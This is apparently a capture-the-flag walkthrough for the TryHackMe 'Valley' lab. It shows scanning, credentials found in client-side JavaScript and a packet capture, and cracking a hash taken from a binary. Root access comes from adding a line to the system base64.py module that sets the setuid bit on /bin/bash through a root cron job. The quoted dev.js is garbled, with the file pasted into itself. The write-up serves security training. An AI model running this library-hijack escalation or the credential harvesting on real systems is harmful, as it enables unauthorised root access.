Valley IP:10.10.228.79


rustscan:

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
37370/tcp open  unknown syn-ack



nmap:


PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel



nikto:

nikto -h 10.10.228.79                                                                                                      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.228.79
+ Target Hostname:    10.10.228.79
+ Target Port:        80
+ Start Time:         2023-06-07 05:52:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 48b, size: 5f6578751d51c, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3268: /static/: Directory indexing found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-06-07 06:03:31 (GMT-4) (672 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




gobuster:

──(kali㉿kali)-[~/Practice/tryhackme/Valley]
└─$ gobuster dir -u 10.10.228.79 -w /usr/share/wordlists/dirb/common.txt -t 64                                                                                                                   1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.228.79
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/07 05:55:26 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/gallery (Status: 301)
/index.html (Status: 200)
/pricing (Status: 301)
/server-status (Status: 403)
/static (Status: 301)
===============================================================
2023/06/07 05:55:32 Finished



visiting /gallery , we can view images, and the url is : http://10.10.228.79/static/14 . Let's list all the photos. First, let's create a new wordlist that contains : 00,01,02,03,04,05,06,07,08,09,00.

 gobuster dir -u 10.10.228.79/static/ -w numlist -t 64                                                     
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.228.79/static/
[+] Threads:        64
[+] Wordlist:       numlist
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/07 06:00:58 Starting gobuster
===============================================================
/00 (Status: 200)
===============================================================
2023/06/07 06:00:58 Finished
===============================================================

we have a hit on 00:

dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts


Visiting http://10.10.228.79/dev1243224123123/ we reach a login:

looking at the source code:

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
  <script defer src="dev.js"></script>
  <script defer src="button.js"></script>
</head>


<body>
  <main id="main-holder">
    <h1 id="login-header">Valley Photo Co. Dev Login</h1>
    
    <div id="login-error-msg-holder">
      <p id="login-error-msg">Invalid username <span id="error-msg-second-line">and/or password</span></p>
    </div>
    
    <form id="login-form">
      <input type="text" name="username" id="username-field" class="login-form-field" placeholder="Username">
      <input type="password" name="password" id="password-field" class="login-form-field" placeholder="Password">
      <input type="submit" value="Login" id="login-form-submit">
    </form>


    <button id="homeButton">Back to Homepage</button>
  
  </main>
</body>

</html>

we find an interesintg js file: dev.js. In this file, we find stored credentials:

const loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("login-form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");

loginForm.style.border = '2px solid #ccc';
loginForm.style.padding = '20px';
loginButton.style.backgroundColor = '#007bff';
loginButton.style.border = 'none';
loginButton.style.borderRadius = '5px';
loginButton.style.color = '#fff';
loginButton.style.cursor = 'pointer';
loginButton.style.padding = '10px';
loginButton.style.marginTop = '10px';


function isValidUsername(username) {

	if(username.length < 5) {

	console.log("Username is valid");

	}
	else {

	console.log("Invalid Username");

	}

}

function isValidPassword(password) {

	if(password.length < 7) {

        console.log("Password is valid");

        }
        else {

        console.log("Invalid Password");

        }

}

function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "const loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("login-form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");

loginForm.style.border = '2px solid #ccc';
loginForm.style.padding = '20px';
loginButton.style.backgroundColor = '#007bff';
loginButton.style.border = 'none';
loginButton.style.borderRadius = '5px';
loginButton.style.color = '#fff';
loginButton.style.cursor = 'pointer';
loginButton.style.padding = '10px';
loginButton.style.marginTop = '10px';


function isValidUsername(username) {

	if(username.length < 5) {

	console.log("Username is valid");

	}
	else {

	console.log("Invalid Username");

	}

}

function isValidPassword(password) {

	if(password.length < 7) {

        console.log("Password is valid");

        }
        else {

        console.log("Invalid Password");

        }

}

function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})


in the initial scan, we found that we have ftp and ssh. let's use these credentials to check if we have access to any to these services:

let's try ftp:

┌──(kali㉿kali)-[~/Practice/tryhackme/Valley]
└─$ ftp 10.10.228.79 37370
Connected to 10.10.228.79.
220 (vsFTPd 3.0.3)
Name (10.10.228.79:kali): siemDev
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> siemFTP.pcapng
?Invalid command
ftp> bin
200 Switching to Binary mode.
ftp> get siemFTP.pcapng
local: siemFTP.pcapng remote: siemFTP.pcapng
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
226 Transfer complete.
7272 bytes received in 0.08 secs (93.4391 kB/s)
ftp> get siemHTTP1.pcapng
local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
226 Transfer complete.
1978716 bytes received in 4.08 secs (473.2256 kB/s)
ftp> get siemHTTP2.pcapng
local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
226 Transfer complete.
1972448 bytes received in 2.04 secs (946.2919 kB/s)
ftp> 

we get all the files

we open the siemHttp2 pcap file, and we look at http requests. there is one post request with length:605 that get's our attention:

Frame 2335: 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
Hypertext Transfer Protocol
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "uname" = "valleyDev"
    Form item: "psw" = "ph0t0s1234"
    Form item: "remember" = "on"

we can try to use these credentials to log in to ssh:


ssh valleyDev@10.10.228.79     
The authenticity of host '10.10.228.79 (10.10.228.79)' can't be established.
ECDSA key fingerprint is SHA256:FXFNT9NFnKkrWkvCpeoDAJlr/IEVsKJjboVsCYH3pGE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.228.79' (ECDSA) to the list of known hosts.
valleyDev@10.10.228.79's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ 


user flag;

valleyDev@valley:~$ ls
user.txt
valleyDev@valley:~$ cat user.txt
THM{k@l1_1n_th3_v@lley}
valleyDev@valley:~$ ls -la
total 24
drwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13 08:17 .
drwxr-xr-x 5 root      root      4096 Mar  6 13:19 ..
-rw-r--r-- 1 root      root         0 Mar 13 09:03 .bash_history
drwx------ 3 valleyDev valleyDev 4096 Mar 20 20:02 .cache
drwx------ 4 valleyDev valleyDev 4096 Mar  6 13:18 .config
drwxr-xr-x 3 valleyDev valleyDev 4096 Mar  6 13:18 .local
-rw-rw-rw- 1 root      root        24 Mar 13 08:17 user.txt
valleyDev@valley:~$ cat .bash_history
valleyDev@valley:~$ cd ..
valleyDev@valley:/home$ ls
siemDev  valley  valleyAuthenticator  valleyDev
valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev
valleyDev@valley:/home$ cd ..
valleyDev@valley:/$ ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  photos  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var
valleyDev@valley:/$ cd /home
valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev



let's copy the valleyAuth on our side;

python3 -m http.server 8000  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.29.89 - - [07/Jun/2023 03:19:08] "GET /valleyAuthenticator HTTP/1.1" 200 -

we perform strings on the valleyAuth and save the output to a txt file( valley.txt), then we search for " user" and we find: e6722920bab2326f8217e4
we use crackstation to crack it: liberty123 .

Using this paswd we try to log in as the other user on the machine( valley):


valleyDev@valley:/home$ su valley
Password: 
valley@valley:/home$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
valley@valley:/home$ 


it works!

valley@valley:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

#
valley@valley:/tmp$ cat /photos/script/photosEncrypt.py 
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
valley@valley:/tmp$ 


we see that photosEncrypt.py imports base64. 
We can use this to get root access

fitst, we need to open /usr/lib/python3.8/base64.py and add 2 lines:

import os

os.system("chmod u+s /bin/bash")

we then save the file and then we wait one minute for the cron job to run.

after this we check that our modification worked:

before:

valley@valley:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash


after:

valley@valley:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

we then do bash -p, and we are root:

valley@valley:/tmp$ bash -p
bash-5.0# id
uid=1000(valley) gid=1000(valley) euid=0(root) groups=1000(valley),1003(valleyAdmin)
bash-5.0# whoami
root
bash-5.0# ls /root
root.txt  snap
bash-5.0# cat /root/root.txt
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
bash-5.0# 





